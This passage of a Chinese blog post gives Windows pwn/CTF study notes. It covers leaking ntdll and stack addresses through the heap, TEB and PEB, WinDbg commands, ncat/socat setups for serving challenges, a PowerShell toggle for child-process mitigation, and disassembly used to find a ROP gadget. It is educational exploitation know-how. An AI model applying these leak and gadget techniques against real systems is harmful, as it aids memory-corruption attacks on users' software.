<p>两者都需要注意栈下溢，一般一个函数调用完会覆盖其返回地址后两到三个数据，需要<code>pop</code>掉。</p>
<h1 id="关于调试"><a href="#关于调试" class="headerlink" title="关于调试"></a>关于调试</h1><p><code>dt _HEAP heapbase -r2</code></p>
<p><code>dt _HEAP_ENTRY chunk_address</code></p>
<h1 id="关于泄露"><a href="#关于泄露" class="headerlink" title="关于泄露"></a>关于泄露</h1><p><code>windows</code>中<code>dll</code>和各种结构体众多，且其相互之间关系比较复杂，所以泄露的过程也比较繁琐多变，最重要的就是<code>ntdll</code>和<code>stack</code>的泄露了。</p>
<p>泄露<code>ntdll</code>的地址可以用堆上的<code>_HEAP_LOCK</code>(一般在<code>heapbase+0x2C0</code>)：</p>
<ul>
<li><code>_HEAP-&gt;LockVariable.Lock</code></li>
<li><code>CriticalSection-&gt;DebugInfo</code></li>
<li>指向<code>ntdll</code>的指针，比如<code>PE</code>或者其他<code>dll</code>的<code>IAT</code>表。</li>
</ul>
<p>泄露栈地址一般有两种方法：</p>
<ul>
<li><code>KERNELBASE!BasepFilterInfo</code>附近，泄露<code>KERNELBASE</code>一般用<code>KERNEL32</code>。</li>
<li><code>TEB+8</code>处为<code>StackBase</code>(其后两字节一般为<code>\x00</code>)，<code>TEB+0x10</code>处为<code>StackLimit</code>(栈的结束地址，其一般最后一字节为<code>\x00</code>，值为<code>StackBase-0x3000</code>，也有可能为<code>StackBase-0x4000</code>)，泄露<code>Teb</code>需要<code>ntdll!PebLdr</code>的地址。</li>
</ul>
<p>关于<code>_PEB_LDR_DATA</code>：</p>
<p><code>fs:[0x30]</code> =&gt; <code>Teb</code> =&gt; <code>Peb</code> =&gt;<code>_PEB_LDR_DATA(和ntdll!PebLdr值一样)</code>=&gt;<code>_LDR_DATA_TABLE_ENTRY</code> </p>
<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20201104203048032.png" alt="image-20201104203048032"></p>
<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20201104203001361.png" alt="image-20201104203001361"></p>
<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20201104203708196.png" alt="image-20201104203708196"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InLoadOrderModuleList;                <span class="comment">//模块加载顺序</span></span><br><span class="line">InMemoryOrderModuleList;              <span class="comment">//模块在内存中的顺序</span></span><br><span class="line">InInitializationOrderModuleList;      <span class="comment">//模块初始化装载顺序</span></span><br></pre></td></tr></table></figure>
<p>这三条双向链表又指向<code>_LDR_DATA_TABLE_ENTRY</code>中的<code>DllBase</code>字段。</p>
<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20201104204150241.png" alt="image-20201104204150241"></p>
<p><img src="https://img-blog.csdnimg.cn/20191023223712174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1NDI2MDEy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>这样可以获得所有<code>dll</code>的基址。</p>
<p><a href="https://www.anquanke.com/post/id/173586" target="_blank" rel="noopener">https://www.anquanke.com/post/id/173586</a></p>
<p><a href="https://blog.csdn.net/qq_35426012/article/details/102711275" target="_blank" rel="noopener">https://blog.csdn.net/qq_35426012/article/details/102711275</a></p>
<h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><h2 id="windbg使用笔记"><a href="#windbg使用笔记" class="headerlink" title="windbg使用笔记"></a>windbg使用笔记</h2><p>断下<code>main</code>函数：<code>bp @$exentry</code> </p>
<p>看进程地址分布(相当于<code>vmmap</code>)：<code>lm</code></p>
<p>列出当前进程中加载的所有<code>dll</code>文件和对应的路径：<code>lmf</code></p>
<p>可以查看任意一个<code>dll</code>的详细信息：<code>lmvm</code></p>
<p>查看地址页权限属性等：<code>!address</code></p>
<p>在内存中搜索字符串：<code>s -a start_address Lrange &quot;your_string&quot;</code>，例如在从<code>0x7f0000000000</code>开始往后的<code>0x1000000</code>范围内搜索<code>xxrwtcl</code>，则为<code>s -a 0x7f0000000000 L1000000 &quot;xxrwtcl&quot;</code>。搜<code>word =&gt; -w</code>，<code>qword =&gt; -q</code>，<code>dword =&gt; -d</code>，<code>unicode =&gt; -u</code>。</p>
<p>查看断点：<code>bl</code></p>
<p>查看当前线程堆栈： <code>kn/kb/kp/kP</code></p>
<p>汇编窗口：<code>ALT+7</code></p>
<p>堆栈窗口：<code>ALT+6</code> 等效于 <code>kn</code></p>
<p>内存窗口：<code>ALT+5</code></p>
<p>寄存器窗口：<code>ALT+4</code></p>
<p>看程序头部信息：<code>!dh -a filename</code></p>
<p>运行程序：<code>F5/g</code></p>
<p>单步步入：<code>F11/F8/t</code></p>
<p>单步步过：<code>F10/p</code></p>
<p>跳出当前函数：<code>shirt+F11</code></p>
<p>重新开始：<code>Ctrl+Shift+F5</code></p>
<p>查看<code>teb/peb</code>地址：<code>r $teb/r $peb</code></p>
<p>查看<code>teb/peb</code>信息：<code>!teb/!peb</code></p>
<p>查看固定地址的数据：<code>db(byte)/w(word)/d(dword)/a(ascii)/u(unicode)/c(char) address(16进制)</code> 也可直接跟寄存器：<code>d esp</code></p>
<p>下断点：<code>bp address</code></p>
<p>查看断点信息：<code>bl</code></p>
<p>删除断点：<code>bc</code></p>
<p>寄存器前加<code>@</code>可以当地址使用：<code>da @rcx</code>，查看<code>rcx</code>寄存器地址处的字符串</p>
<p>修改内存：<code>e</code>，用法与<code>d</code>类似，<code>eb/ew/ed/eq/ep/ea/eu address value</code></p>
<p>命令显示或修改寄存器、浮点寄存器、标志位、伪寄存器和预定义别名：<code>r</code></p>
<ul>
<li><p>直接用<code>r</code>，会显示当前线程的寄存器状态</p>
<p><code>~0 r</code>表示显示0号线程的寄存器状态</p>
<p><code>~* r</code>会显示所有线程的寄存器状态</p>
<p><code>~0 r eax = 0x1</code>可以对<code>1线程</code>进行<code>eax</code>赋值</p>
<p><code>~* r eax = 0x1</code>，可以对所有线程进行<code>eax</code>赋值</p>
</li>
</ul>
<p>加载符号文件：<code>reload !sym</code></p>
<p>把指定地址上的代码翻译成汇编输出：<code>u address</code></p>
<p>查看符号的二进制地址：<code>x</code> -&gt; <code>x ucrtbase!system</code> ，支持通配符：<code>x ucrtbase!*</code>列出<code>ucrtbase</code>模块所有符号和对应的二进制地址。</p>
<p><code>dds address/reg</code>打印内存地址/寄存器指向地址上的二进制值，同时自动搜索二进制值对应的符号。<code>x86</code>为<code>dds</code>，<code>x64</code>为<code>dqs</code>，<code>dps</code>自动根据当前处理器架构来选择最合适的长度。</p>
<p><code>dt</code>命令显示局部变量、全局变量或数据类型的信息。它也可以仅显示数据类型。即结构和联合(union)的信息。</p>
<ul>
<li><code>dt _peb</code></li>
<li><code>dt ntdll!_peb</code></li>
<li><code>dt _heap</code></li>
<li><code>dt _heap_entry</code></li>
<li><code>dt _teb</code></li>
</ul>
<p><code>~</code>  命令是用来切换目标线程</p>
<ul>
<li><p><code>~</code> 可以显示线程的信息<br><code>~0s</code>  把当前的线程切换到0号线程，也就是主线程，切换后<code>提示符会变为0:000</code>，<strong>查看<code>teb</code>时一定要切换到主线程</strong></p>
<p><code>~*</code> 命令列出当前进程中的所有线程的详细信息</p>
<p><code>~*kb</code>  命令列出所有线程的堆栈</p>
</li>
</ul>
<p>找<code>IAT</code>表项：例如，找<code>KERNEL32</code>中从<code>ntdll.dll</code>导出的符号：<code>x KERNEL32!_imp__nt*</code></p>
<p>在做堆题时一些有用的命令：</p>
<ul>
<li><code>!heap</code></li>
<li><code>!heap -a [heap address]</code></li>
<li><code>dt _HEAP [heap address]</code></li>
<li><code>dt _HEAP_LIST_LOOKUP [address]</code></li>
<li><code>dt _LFH_HEAP</code></li>
<li><p>More Windbg usage</p>
<ul>
<li><a href="https://github.com/hugsy/defcon_27_windbg_workshop" target="_blank" rel="noopener"><code>https://github.com/hugsy/defcon_27_windbg_workshop</code></a></li>
</ul>
</li>
<li><p>我的配置：</p>
<ul>
<li>Font：<code>Lucida Sans Typewriter</code> size：<code>五号</code></li>
<li>Background：<code>black</code></li>
<li>Text：<code>white</code></li>
<li>Normal level command window text：<code>white</code></li>
<li>Normal level command window text background：<code>black</code></li>
<li>Prompt level command window text：<code>red</code></li>
<li>Prompt level command window text background：<code>black</code></li>
</ul>
</li>
</ul>
<h2 id="关于交互"><a href="#关于交互" class="headerlink" title="关于交互"></a>关于交互</h2><p>python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">InputCmd</span><span class="params">(stdin, cmd)</span>:</span></span><br><span class="line">    stdin.write(cmd)</span><br><span class="line">    stdin.flush()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">OutputCmd</span><span class="params">(stdout)</span>:</span></span><br><span class="line">    // 如果没有输出, 调整睡眠时间</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    print(stdout.read().decode(<span class="string">"gbk"</span>, <span class="string">'ignore'</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    fileOut = open(<span class="string">"fout.txt"</span>, <span class="string">"wb"</span>)</span><br><span class="line">    readFileOut = open(<span class="string">"fout.txt"</span>, <span class="string">"rb"</span>)</span><br><span class="line"> </span><br><span class="line">    prog = subprocess.Popen(<span class="string">"babystack.exe"</span>, stdin = subprocess.PIPE,</span><br><span class="line">                            stdout = fileOut)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        OutputCmd(readFileOut)</span><br><span class="line">        cmd = input(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"EXIT"</span> == cmd:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'b'</span> == cmd[<span class="number">0</span>] <span class="keyword">and</span> (<span class="string">'"'</span> == cmd[<span class="number">1</span>] <span class="keyword">or</span> <span class="string">"'"</span> == cmd[<span class="number">1</span>]):</span><br><span class="line">            cmd = ast.literal_eval(cmd) + <span class="string">b'\n'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cmd = cmd.encode(<span class="string">"utf-8"</span>) + <span class="string">b'\n'</span></span><br><span class="line">        InputCmd(prog.stdin, cmd)</span><br><span class="line"> </span><br><span class="line">    prog.terminate()</span><br><span class="line">    readFileOut.close()</span><br><span class="line">    fileOut.close()</span><br><span class="line">    os.remove(<span class="string">"fout.txt"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> <span class="string">"__main__"</span> == __name__:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<hr>
<p>很多题目自带一个<code>AppJailLauncher</code>，相当于一个Windows底下的stdio服务器和沙盒，在Win 7下面也是不能直接运行这个程序的，仅支持<code>above Windows8</code>且为<code>x64</code>。</p>
<p>程序源码：<a href="https://github.com/trailofbits/AppJailLauncher" target="_blank" rel="noopener">https://github.com/trailofbits/AppJailLauncher</a></p>
<hr>
<p><code>Ex</code>师傅也写了一个类似的程序，不过没有加沙盒。</p>
<p>程序源码：<a href="https://github.com/Ex-Origin/win_server" target="_blank" rel="noopener">https://github.com/Ex-Origin/win_server</a></p>
<hr>
<p>最方便的方法其实和<code>Linux</code>下面<code>Pwn</code>题目开端口一样，只需要下载<code>nmap</code>，用里面的<code>ncat</code>来打开端口转发<code>stdio</code>即可，具体命令如下：<br><code>ncat -vc &quot;winpwn.exe&quot; -kl 192.168.21.1 4444</code>。</p>
<p>通过<code>TCP</code>连接上端口之后<code>ncat</code>就会自动打开一个进程，要调试的时候只需要用<code>windbg attach</code>上对应进程即可。</p>
<hr>
<p>或者直接在<code>wsl</code>下<code>socat tcp-l:1337,fork,reuseaddr exec:./winpwn.exe</code>，我竟然才知道<code>wsl</code>可以运行<code>exe</code>程序，🤮。</p>
<hr>
<p><code>powershell Set-ProcessMitigation -Name winpwn.exe -Disable DisallowChildProcessCreati
on</code></p>
<p><code>powershell Set-ProcessMitigation -Name winpwn.exe -Enable DisallowChildProcessCreati
on</code></p>
<p><code>powershell Get-ProcessMitigation -Name winpwn.exe</code></p>
<h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><p><a href="https://www.one-tab.com/page/eaArgKkOSsCm-0oGNbAu1w" target="_blank" rel="noopener">https://www.one-tab.com/page/eaArgKkOSsCm-0oGNbAu1w</a></p>
<p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/07/09/winpwn/" target="_blank" rel="noopener">https://xuanxuanblingbling.github.io/ctf/pwn/2020/07/09/winpwn/</a></p>
<p><a href="https://kirin-say.top/2020/01/01/Heap-in-Windows/" target="_blank" rel="noopener">https://kirin-say.top/2020/01/01/Heap-in-Windows/</a></p>
<p><a href="https://github.com/A7um/slides/blob/master/2017/WinPWN.pdf" target="_blank" rel="noopener">https://github.com/A7um/slides/blob/master/2017/WinPWN.pdf</a></p>
<p><a href="https://ble55ing.github.io/2019/08/18/WindowsPwn0/#linux的exp生成方式在windwos上的应用" target="_blank" rel="noopener">https://ble55ing.github.io/2019/08/18/WindowsPwn0/#linux%E7%9A%84exp%E7%94%9F%E6%88%90%E6%96%B9%E5%BC%8F%E5%9C%A8windwos%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8</a></p>
<p><a href="https://ble55ing.github.io/2019/08/18/WindowsPwnHeap/#dword-shoot" target="_blank" rel="noopener">https://ble55ing.github.io/2019/08/18/WindowsPwnHeap/#dword-shoot</a></p>
<p><a href="https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-chinese-version" target="_blank" rel="noopener">https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-chinese-version</a></p>
<p><a href="http://showlinkroom.me/2020/07/14/WindowsHeap101/" target="_blank" rel="noopener">http://showlinkroom.me/2020/07/14/WindowsHeap101/</a></p>
<p><a href="https://github.com/saaramar/Publications/blob/master/35C3_Windows_Mitigations/Modern%20Windows%20Userspace%20Exploitation.pdf" target="_blank" rel="noopener">https://github.com/saaramar/Publications/blob/master/35C3_Windows_Mitigations/Modern%20Windows%20Userspace%20Exploitation.pdf</a></p>
<h2 id="ntdll-RtlCaptureContext"><a href="#ntdll-RtlCaptureContext" class="headerlink" title="ntdll!RtlCaptureContext"></a>ntdll!RtlCaptureContext</h2><p>获取<code>stack</code>地址的方法：调用<code>ntdll!RtlCaptureContext</code>，其<code>rcx</code>指向一个结构体(<code>ContextRecord structure</code>)，并且将几乎所有的寄存器都写入这个结构体中，其中包含<code>rsp</code>，我们再将其读出即可：</p>
<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20201106161234548.png" alt="image-20201106161234548"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000001800</span>A0100 ; <span class="keyword">void</span> __<span class="function">stdcall <span class="title">RtlCaptureContext</span><span class="params">(PCONTEXT ContextRecord)</span></span></span><br><span class="line">.text:00000001800A0100                 public RtlCaptureContext</span><br><span class="line">.text:<span class="number">00000001800</span>A0100 RtlCaptureContext proc near             ; CODE XREF: _invalid_parameter+<span class="number">20</span>↑p</span><br><span class="line">.text:<span class="number">00000001800</span>A0100                                         ; __report_gsfailure+<span class="number">13</span>↑p ...</span><br><span class="line">.text:<span class="number">00000001800</span>A0100</span><br><span class="line">.text:<span class="number">00000001800</span>A0100 var_8           = dword ptr <span class="number">-8</span></span><br><span class="line">.text:<span class="number">00000001800</span>A0100 arg_0           = byte ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000001800</span>A0100</span><br><span class="line">.text:<span class="number">00000001800</span>A0100                 pushfq</span><br><span class="line">.text:<span class="number">00000001800</span>A0102                 mov     [rcx+<span class="number">78</span>h], rax</span><br><span class="line">.text:<span class="number">00000001800</span>A0106                 mov     [rcx+<span class="number">80</span>h], rcx</span><br><span class="line">.text:<span class="number">00000001800</span>A010D                 mov     [rcx+<span class="number">88</span>h], rdx</span><br><span class="line">.text:<span class="number">00000001800</span>A0114                 mov     [rcx+<span class="number">0B</span>8h], r8</span><br><span class="line">.text:<span class="number">00000001800</span>A011B                 mov     [rcx+<span class="number">0</span>C0h], r9</span><br><span class="line">.text:<span class="number">00000001800</span>A0122                 mov     [rcx+<span class="number">0</span>C8h], r10</span><br><span class="line">.text:<span class="number">00000001800</span>A0129                 mov     [rcx+<span class="number">0</span>D0h], r11</span><br><span class="line">.text:<span class="number">00000001800</span>A0130                 fxsave  dword ptr [rcx+<span class="number">100</span>h]</span><br><span class="line">.text:<span class="number">00000001800</span>A0137</span><br><span class="line">.text:<span class="number">00000001800</span>A0137 CcSaveNVContext:                        ; DATA XREF: RtlpCaptureContext+<span class="number">67</span>↑o</span><br><span class="line">.text:<span class="number">00000001800</span>A0137                 mov     word ptr [rcx+<span class="number">38</span>h], cs</span><br><span class="line">.text:<span class="number">00000001800</span>A013A                 mov     word ptr [rcx+<span class="number">3</span>Ah], ds</span><br><span class="line">.text:<span class="number">00000001800</span>A013D                 mov     word ptr [rcx+<span class="number">3</span>Ch], es</span><br><span class="line">.text:<span class="number">00000001800</span>A0140                 mov     word ptr [rcx+<span class="number">42</span>h], ss</span><br><span class="line">.text:<span class="number">00000001800</span>A0143                 mov     word ptr [rcx+<span class="number">3</span>Eh], fs</span><br><span class="line">.text:<span class="number">00000001800</span>A0146                 mov     word ptr [rcx+<span class="number">40</span>h], gs</span><br><span class="line">.text:<span class="number">00000001800</span>A0149                 mov     [rcx+<span class="number">90</span>h], rbx</span><br><span class="line">.text:<span class="number">00000001800</span>A0150                 mov     [rcx+<span class="number">0</span>A0h], rbp</span><br><span class="line">.text:<span class="number">00000001800</span>A0157                 mov     [rcx+<span class="number">0</span>A8h], rsi</span><br><span class="line">.text:<span class="number">00000001800</span>A015E                 mov     [rcx+<span class="number">0B</span>0h], rdi</span><br><span class="line">.text:<span class="number">00000001800</span>A0165                 mov     [rcx+<span class="number">0</span>D8h], r12</span><br><span class="line">.text:<span class="number">00000001800</span>A016C                 mov     [rcx+<span class="number">0E0</span>h], r13</span><br><span class="line">.text:<span class="number">00000001800</span>A0173                 mov     [rcx+<span class="number">0E8</span>h], r14</span><br><span class="line">.text:<span class="number">00000001800</span>A017A                 mov     [rcx+<span class="number">0F</span>0h], r15</span><br><span class="line">.text:<span class="number">00000001800</span>A0181                 stmxcsr dword ptr [rcx+<span class="number">34</span>h]</span><br><span class="line">.text:<span class="number">00000001800</span>A0185                 lea     rax, [rsp+<span class="number">8</span>+arg_0]  <span class="comment">//here</span></span><br><span class="line">.text:<span class="number">00000001800</span>A018A                 mov     [rcx+<span class="number">98</span>h], rax      <span class="comment">//here</span></span><br><span class="line">.text:<span class="number">00000001800</span>A0191                 mov     rax, [rsp+<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">00000001800</span>A0196                 mov     [rcx+<span class="number">0F</span>8h], rax</span><br><span class="line">.text:<span class="number">00000001800</span>A019D                 mov     eax, [rsp+<span class="number">8</span>+var_8]</span><br><span class="line">.text:<span class="number">00000001800</span>A01A0                 mov     [rcx+<span class="number">44</span>h], eax</span><br><span class="line">.text:<span class="number">00000001800</span>A01A3                 mov     dword ptr [rcx+<span class="number">30</span>h], <span class="number">10000F</span>h</span><br><span class="line">.text:<span class="number">00000001800</span>A01AA                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000001800</span>A01AE                 retn</span><br><span class="line">.text:<span class="number">00000001800</span>A01AE RtlCaptureContext endp</span><br></pre></td></tr></table></figure>
<hr>
<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20201104165855975.png" alt="image-20201104165855975"></p>
<hr>
<h2 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h2><p><code>system</code> =&gt; <code>common_system&lt;char&gt;</code> =&gt; <code>common_spawnv&lt;char&gt;</code> =&gt; <code>execute_command&lt;char&gt;</code> =&gt; <code>_acrt_CreateProcessA</code> =&gt; <code>kernel32!CreateProcessWStub</code> =&gt; <code>kernelbase!CreateProcessW</code> =&gt; <code>kernelbase!CreateProcessInternalW</code> =&gt; <code>ntdll!NtCreateUserProcess</code>=&gt; <code>syscall</code></p>
<p><a href="https://www.cnblogs.com/arxive/p/11748114.html" target="_blank" rel="noopener">https://www.cnblogs.com/arxive/p/11748114.html</a></p>
<p><a href="http://blog.leanote.com/post/snowming/6e3293284019" target="_blank" rel="noopener">http://blog.leanote.com/post/snowming/6e3293284019</a></p>
<p><a href="https://j00ru.vexillium.org/syscalls/nt/64/" target="_blank" rel="noopener">Windows_x64_系统调用号表</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000018009</span>D920 NtCreateUserProcess proc near           ; CODE XREF: RtlpCreateUserProcess+<span class="number">272</span>↑p</span><br><span class="line">.text:<span class="number">000000018009</span>D920                                         ; DATA XREF: .rdata:<span class="number">0000000180118F</span>20↓o ...</span><br><span class="line">.text:<span class="number">000000018009</span>D920                 mov     r10, rcx        ; NtCreateUserProcess</span><br><span class="line">.text:<span class="number">000000018009</span>D923                 mov     eax, <span class="number">0</span>C4h</span><br><span class="line">.text:<span class="number">000000018009</span>D928                 test    byte ptr ds:<span class="number">7F</span>FE0308h, <span class="number">1</span></span><br><span class="line">.text:<span class="number">000000018009</span>D930                 jnz     <span class="keyword">short</span> loc_18009D935</span><br><span class="line">.text:<span class="number">000000018009</span>D932                 syscall                 ; Low latency system call</span><br><span class="line">.text:<span class="number">000000018009</span>D934                 retn</span><br><span class="line">.text:<span class="number">000000018009</span>D935 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000018009</span>D935</span><br><span class="line">.text:<span class="number">000000018009</span>D935 loc_18009D935:                          ; CODE XREF: NtCreateUserProcess+<span class="number">10</span>↑j</span><br><span class="line">.text:<span class="number">000000018009</span>D935                 <span class="keyword">int</span>     <span class="number">2</span>Eh             ; DOS <span class="number">2</span>+ internal - EXECUTE COMMAND</span><br><span class="line">.text:<span class="number">000000018009</span>D935                                         ; DS:SI -&gt; counted CR-terminated command <span class="built_in">string</span></span><br><span class="line">.text:<span class="number">000000018009</span>D937                 retn</span><br><span class="line">.text:<span class="number">000000018009</span>D937 NtCreateUserProcess endp</span><br></pre></td></tr></table></figure>
<hr>
<p><a href="https://gist.github.com/apogiatzis/fb617cd118a9882749b5cb167dae0c5d" target="_blank" rel="noopener">check.py</a></p>
<p><a href="https://docs.microsoft.com/en-us/cpp/windows/universal-crt-deployment?view=msvc-160&amp;viewFallbackFrom=vs-2019" target="_blank" rel="noopener">ucrtbase的发展历史</a></p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN" target="_blank" rel="noopener">dll的search流程</a></p>
<p><a href="http://www.windbg.org/" target="_blank" rel="noopener">http://www.windbg.org/</a></p>
<hr>
<p><code>ntdll!LdrpHandleInvalidUserCallTarget</code>函数中含有可以通用的<code>gadget</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000018008</span>C400 LdrpHandleInvalidUserCallTarget proc near</span><br><span class="line">.text:<span class="number">000000018008</span>C400                                         ; CODE XREF: LdrpValidateUserCallTarget+<span class="number">41</span>↓j</span><br><span class="line">.text:<span class="number">000000018008</span>C400                                         ; LdrpValidateUserCallTargetES+<span class="number">41</span>↓j ...</span><br><span class="line">.text:<span class="number">000000018008</span>C400</span><br><span class="line">.text:<span class="number">000000018008</span>C400 var_98          = xmmword ptr <span class="number">-98</span>h</span><br><span class="line">.text:<span class="number">000000018008</span>C400 var_88          = xmmword ptr <span class="number">-88</span>h</span><br><span class="line">.text:<span class="number">000000018008</span>C400 var_78          = xmmword ptr <span class="number">-78</span>h</span><br><span class="line">.text:<span class="number">000000018008</span>C400 var_68          = xmmword ptr <span class="number">-68</span>h</span><br><span class="line">.text:<span class="number">000000018008</span>C400 var_58          = xmmword ptr <span class="number">-58</span>h</span><br><span class="line">.text:<span class="number">000000018008</span>C400 var_48          = xmmword ptr <span class="number">-48</span>h</span><br><span class="line">.text:<span class="number">000000018008</span>C400 var_10          = qword ptr <span class="number">-10</span>h</span><br><span class="line">.text:<span class="number">000000018008</span>C400</span><br><span class="line">.text:<span class="number">000000018008</span>C400                 push    r11</span><br><span class="line">.text:<span class="number">000000018008</span>C402                 push    r10</span><br><span class="line">.text:<span class="number">000000018008</span>C404                 push    r9</span><br><span class="line">.text:<span class="number">000000018008</span>C406                 push    r8</span><br><span class="line">.text:<span class="number">000000018008</span>C408                 push    rcx</span><br><span class="line">.text:<span class="number">000000018008</span>C409                 push    rdx</span><br><span class="line">.text:<span class="number">000000018008</span>C40A                 push    rax</span><br><span class="line">.text:<span class="number">000000018008</span>C40B                 sub     rsp, <span class="number">80</span>h</span><br><span class="line">.text:<span class="number">000000018008</span>C412                 movaps  [rsp+<span class="number">0B</span>8h+var_98], xmm0</span><br><span class="line">.text:<span class="number">000000018008</span>C417                 movaps  [rsp+<span class="number">0B</span>8h+var_88], xmm1</span><br><span class="line">.text:<span class="number">000000018008</span>C41C                 movaps  [rsp+<span class="number">0B</span>8h+var_78], xmm2</span><br><span class="line">.text:<span class="number">000000018008</span>C421                 movaps  [rsp+<span class="number">0B</span>8h+var_68], xmm3</span><br><span class="line">.text:<span class="number">000000018008</span>C426                 movaps  [rsp+<span class="number">0B</span>8h+var_58], xmm4</span><br><span class="line">.text:<span class="number">000000018008</span>C42B                 movaps  [rsp+<span class="number">0B</span>8h+var_48], xmm5</span><br><span class="line">.text:<span class="number">000000018008</span>C430                 mov     rcx, rax</span><br><span class="line">.text:<span class="number">000000018008</span>C433                 call    